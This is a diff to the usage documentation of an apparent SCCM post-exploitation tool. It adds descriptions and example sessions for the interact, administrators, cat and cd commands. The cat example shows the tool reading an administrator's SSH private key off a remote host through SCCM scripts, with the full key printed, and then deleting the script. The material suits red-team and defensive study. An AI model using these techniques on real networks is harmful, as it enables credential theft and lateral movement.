@@ -370,9 +370,17 @@ whoami
 ### Example
 
 # interact
-### Description
+### Description 
+Sets the target device for command line interactions to a specified ResourceID. This setting must be configured prior to any remote enumeration or script execution.
+
 ### Usage
+
+interact [ResourceID]
+
 ### Example
+In the below example, the `dp` device is queried. In the result the `16777221` is returned. The operator can now interact with that device and configure the command line. 
+
+
 ```
 () (C:\) >> get_device dp
 [19:54:23] INFO     ------------------------------------------                                                                                                                                                                         
@@ -397,8 +405,12 @@ whoami
 ```
 
 # administrators
-### Description
+### Description 
+Query the interactive device for members of the device's local administrators group.
+
 ### Usage
+See below.
+
 ### Example
 ```
 (16777221) (C:\) >> administrators 
@@ -417,14 +429,97 @@ whoami
 ```
 
 # cat
-### Description
+### Description 
+Display the contents of a file on the interactive device. The command line must be configured with the path to the file contents directory. For example, if the file you want to display is in "C:\Windows\Temp", you must issue a `cd` command to configure the command line with that file path in addition to the interactive device. NOTE: SCCM limits the result returned from scripts to 4KB. If the file size is larger it will be truncated or unreliable. Additionally, since scripts are used, you may need to supply alternate credentials. See scripts for more information.
+
 ### Usage
+cat [filename]
 ### Example
+```
+(16777221) (C:\) >> cd C:\Users\administrator.LAB\.ssh
+(16777221) (C:\Users\administrator.LAB\.ssh\) >> cat id_rsa
+[23:21:41] INFO     Tasked SCCM to show id_rsa                                                                                                                                                                                         
+[23:21:43] INFO     [+] Updates script created successfully with GUID 22057b18-d704-4734-ac35-2641eae96fb4.                                                                                                                            
+[23:21:47] INFO     [+] Script with guid 22057b18-d704-4734-ac35-2641eae96fb4 approved.                                                                                                                                                
+[23:21:49] INFO     [+] Script with guid 22057b18-d704-4734-ac35-2641eae96fb4 executed.                                                                                                                                                
+[23:22:08] INFO     [+] Got result:                                                                                                                                                                                                    
+[23:22:08] INFO     -----BEGIN OPENSSH PRIVATE KEY-----                                                                                                                                                                                
+                    b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn                                                                                                                                             
+                    NhAAAAAwEAAQAAAYEAv0P8SG6b1AfXaWVmslD32pxVgncux1cxgNv6CnnG/OxDvAQdsBiB                                                                                                                                             
+                    Pf2D3u8PjEkjH2x9N5te3sc5SK/3umM3RKu0QZ0fa6wbyUigPyq5NyRuNF9ky84A8OOrik                                                                                                                                             
+                    0XBUtqt2sdQWRP4OJsN7YK6W2e5SMu0MJfveId6OmReYayVEMt4KSrYpQ62TGqwPOu56r9                                                                                                                                             
+                    VSSu8l36fK7+nKzFCq2LeqCHD9/kXlbggRJZZdINgWX3IPpd9mqUKy74HBSXrgIjPaF76I                                                                                                                                             
+                    4wuIIkFaMpQ1L5BBOZt/EgI//0PPkcGRlnevK+9G9gFfcQFN59BB0YGMjTNJ0zvtJswY7u                                                                                                                                             
+                    gAkRINBoUPZFg0QlHa8a6zDF1v4uUrH0+2G43lLk90fyO4GfCSyGrYV33nfnIR1mYuPjFW                                                                                                                                             
+                    xmhOiIV4F/sprTjR0v1YUxWVUfJIC0yG4ZIpWqr2Mh9tiuHgAlknJftecpnEaJlmWZKcvv                                                                                                                                             
+                    nbKP+fsqgT2UP7bTAh0kcYE4M+gz1puYJoLyrFvLAAAFkMzZOuvM2TrrAAAAB3NzaC1yc2                                                                                                                                             
+                    EAAAGBAL9D/Ehum9QH12llZrJQ99qcVYJ3LsdXMYDb+gp5xvzsQ7wEHbAYgT39g97vD4xJ                                                                                                                                             
+                    Ix9sfTebXt7HOUiv97pjN0SrtEGdH2usG8lIoD8quTckbjRfZMvOAPDjq4pNFwVLardrHU                                                                                                                                             
+                    FkT+DibDe2CultnuUjLtDCX73iHejpkXmGslRDLeCkq2KUOtkxqsDzrueq/VUkrvJd+nyu                                                                                                                                             
+                    /pysxQqti3qghw/f5F5W4IESWWXSDYFl9yD6XfZqlCsu+BwUl64CIz2he+iOMLiCJBWjKU                                                                                                                                             
+                    NS+QQTmbfxICP/9Dz5HBkZZ3ryvvRvYBX3EBTefQQdGBjI0zSdM77SbMGO7oAJESDQaFD2                                                                                                                                             
+                    RYNEJR2vGuswxdb+LlKx9PthuN5S5PdH8juBnwkshq2Fd9535yEdZmLj4xVsZoToiFeBf7                                                                                                                                             
+                    Ka040dL9WFMVlVHySAtMhuGSKVqq9jIfbYrh4AJZJyX7XnKZxGiZZlmSnL752yj/n7KoE9                                                                                                                                             
+                    lD+20wIdJHGBODPoM9abmCaC8qxbywAAAAMBAAEAAAGBAIjAiT8Ypp4BRUl8UOMp9Sz/Hj                                                                                                                                             
+                    x8DpxEgYaKwcp/q4DnRL7Hipp/ytiRzJm2/7zkBhLPtO/vTPOoKhMIje1cRwX4ZpeLSg3o                                                                                                                                             
+                    Lq3KGZlQaME+cPVNR3pYvl99yQbHe7AzbgfatD4vBNXbzlg+9qpT0Iowj6Z/c4kGhTAk3/                                                                                                                                             
+                    iuEA8jQUgfNNL0/OaSFm6DTQkjPqKD6fosq44+aJmJBhFOaC2zXR5CjLvPDhH7FqQwfauJ                                                                                                                                             
+                    Rhr0J/6p0WrW2Frrdk/aAi/+pZ9UFqt2o4DD+zykEIJOoc6eKNGe+aUyynGM8KXC/P4e1U                                                                                                                                             
+                    qogDHufaok0Nhhwp/TliazP80FMwYEib1uKdxinT1k1JaLYDfdptPaYWDBxBgnvFmsAEsH                                                                                                                                             
+                    ePz8oc3nNePRR48PhfH/yqeUB8QryDkr6ril2E0UmqF2YU2fj7ZHx2JM3prPKx8vBiNrrG                                                                                                                                             
+                    ZyyYcaYESiXbMXZ2/betlp0R3nQ1gTmv/vaqsN1wy8W8OBcQYz33SDq4j/xPkFcZBQoQAA                                                                                                                                             
+                    AMAY/+54mljzB4VtLznw8y5A3vxFoQZM4Jb1FWr4fNXPkR0MS8W6o6bIFve/+b/P7se5m4                                                                                                                                             
+                    QSrtCbKck8aQj1lb2apYAs9q899iQH4AZzz8x0taubQbpgA7eOkOB59zhom1biUi+WeU/P                                                                                                                                             
+                    H7yKWgMY0evTigMSKDNmUoxXE8+Ay4Azm5pj8cL5oUWhVqwX/oJ67pIqpRCBPn7BXWz8i5                                                                                                                                             
+                    NGSHaGfknMQhk2oT0+sYJrYDaFqF/YqQBgEbMUgbTI1uTvnKIAAADBAN5ZvoyiNYiNelQF                                                                                                                                             
+                    Iv6S7FZIyu/OTGgQui6QxneWAcKEF53s3MP9KkzY9cx4JkWVik8+MC0MEqH8ds4HiYOIQG                                                                                                                                             
+                    njJddl1AU43eO+w3whirOkorlPOat/ec1J11iRVUk59rm3Cahm4C/OX//jTbNsZ7EqyClU                                                                                                                                             
+                    xqcSLe+k5OkTWllAKr6H1lTiLAidQBkm3sDMObDkiYeyKsPApL81hVPnpYizWSjGhlah7c                                                                                                                                             
+                    VraPqUNWtDXOParqUq6kPKOwuoqOIfcwAAAMEA3DX0Bm71bnLqP6BA5b85R4NCcbp7GTdb                                                                                                                                             
+                    gz5eBUxyPQ/I2AYrz8aMdvbP7jyRbHnMul+rbwU+NE4v0wG9GbQzxuHbizVWKHKeFWNwsd                                                                                                                                             
+                    pkeFf6c77iL6Tv2fTROkFhlroKPNKY0rzPYiCo4UyohnFYmyP4S+Rci8vpsAol53fllpaJ                                                                                                                                             
+                    EMw09ZBUefL3uURnY3bTXkfroxCG0nULuVptxffvBQ/Lv9+efnrYIS890gEqm+zMxGu7ae                                                                                                                                             
+                    ZLdczteWBuaAxJAAAAFGxhYlxhZG1pbmlzdHJhdG9yQGRwAQIDBAUG                                                                                                                                                             
+                    -----END OPENSSH PRIVATE KEY-----                                                                                                                                                                                  
+[23:22:12] INFO     [+] Script with GUID 22057b18-d704-4734-ac35-2641eae96fb4 deleted.                                                                                                                                                 
+(16777221) (C:\Users\administrator.LAB\.ssh\) >> 
+```
+
 
 # cd
 ### Description
+Change directories on the command line. This is required for both the `ls` and `cat` commands.
+
+
 ### Usage
+
+cd [filepath]
+
 ### Example
+```
+(16777221) (C:\) >> cd C:\Users
+(16777221) (C:\Users\) >> ls
+[23:25:28] INFO     Tasked SCCM to list files in C:\Users\.                                                                                                                                                                            
+[23:25:28] INFO     Got OperationId 16779694. Sleeping 10 seconds to wait for host to call home.                                                                                                                                       
+[23:25:41] INFO     +----------------------------+--------+---------------------+--------+----------+                                                                                                                                  
+                    | FileName                   | Mode   | LastWriteTime       |   Size | Device   |                                                                                                                                  
+                    +============================+========+=====================+========+==========+                                                                                                                                  
+                    | C:\Users\Administrator     | d----- | 2024-01-27 05:53:07 |      1 | DP       |                                                                                                                                  
+                    +----------------------------+--------+---------------------+--------+----------+                                                                                                                                  
+                    | C:\Users\administrator.LAB | d----- | 2024-02-08 07:21:12 |      1 | DP       |                                                                                                                                  
+                    +----------------------------+--------+---------------------+--------+----------+                                                                                                                                  
+                    | C:\Users\All Users         | d--hsl | 2021-05-08 08:34:03 |      1 | DP       |                                                                                                                                  
+                    +----------------------------+--------+---------------------+--------+----------+                                                                                                                                  
+                    | C:\Users\Default           | d-rh-- | 2024-01-27 21:59:32 |      1 | DP       |                                                                                                                                  
+                    +----------------------------+--------+---------------------+--------+----------+                                                                                                                                  
+                    | C:\Users\Default User      | d--hsl | 2021-05-08 08:34:03 |      1 | DP       |                                                                                                                                  
+                    +----------------------------+--------+---------------------+--------+----------+                                                                                                                                  
+                    | C:\Users\Public            | d-r--- | 2024-01-27 05:53:07 |      1 | DP       |                                                                                                                                  
+                    +----------------------------+--------+---------------------+--------+----------+                                                                                                                                  
+                    | C:\Users\desktop.ini       | -a-hs- | 2021-05-08 08:18:31 |    174 | DP       |                                                                                                                                  
+                    +----------------------------+--------+---------------------+--------+----------+                                                                                                                                  
+(16777221) (C:\Users\) >> 
+```
 
 # console_users
 ### Description
